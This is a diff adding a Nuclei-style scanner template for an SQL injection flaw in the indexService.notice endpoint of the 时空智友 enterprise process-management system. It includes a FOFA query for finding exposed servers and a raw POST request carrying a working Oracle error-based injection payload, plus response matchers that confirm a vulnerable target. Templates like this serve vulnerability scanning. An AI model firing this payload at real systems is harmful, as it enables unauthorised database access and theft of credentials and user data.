@@ -1,0 +1,31 @@
+id: shikongzhiyou-indexService_notice-sql
+
+info:
+  name: "时空智友企业流程化管控系统 indexService.notice 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="时空智友企业信息管理"
+    时空智友企业流程化管控系统在indexService.notice接口中存在SQL注入缺陷。攻击者可通过构造恶意SQL查询实现数据库信息泄露，包括但不限于管理员凭证及用户敏感数据。在具备高权限操作条件下，可能通过注入点执行系统命令或部署恶意负载，进而控制服务器资源。
+  reference:
+  - https://mp.weixin.qq.com/s/0Ssah295z17Keb4KSltXkQ
+  tags: 时空智友
+
+http:
+- raw:
+  - |
+    POST /formservice?service=indexService.notice HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    Content-Type: application/json
+
+    {"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qzpvq1qzvvq'
+  - type: status
+    status:
+    - 200
